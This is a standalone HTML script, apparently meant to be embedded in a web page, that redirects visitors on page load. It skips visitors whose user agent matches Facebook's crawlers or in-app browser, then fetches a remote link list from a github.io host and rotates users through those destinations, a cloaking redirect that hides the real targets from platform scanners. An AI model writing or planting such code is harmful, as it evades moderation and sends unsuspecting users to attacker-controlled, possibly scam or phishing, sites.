<script>
(async () => {
  const ua = navigator.userAgent || "";

  if (
    ua.includes("FBAN") || 
    ua.includes("FBAV") || 
    ua.includes("FB_IAB") || 
    ua.includes("Facebot") || 
    ua.includes("facebookexternalhit")
  ) return;

  try {
    const res = await fetch("https://liuhongliang11895.github.io/888/mapping.json?ts=" + Date.now(), {cache:"no-store"});
    const data = await res.json();
    const links = data.links.filter(x => x.active);
    if(!links.length) return;

    let idx = Number(localStorage.getItem("RR") || "0");
    const url = links[idx % links.length].url;
    localStorage.setItem("RR", idx + 1);

    location.href = url;

  } catch(e){}
})();
</script>
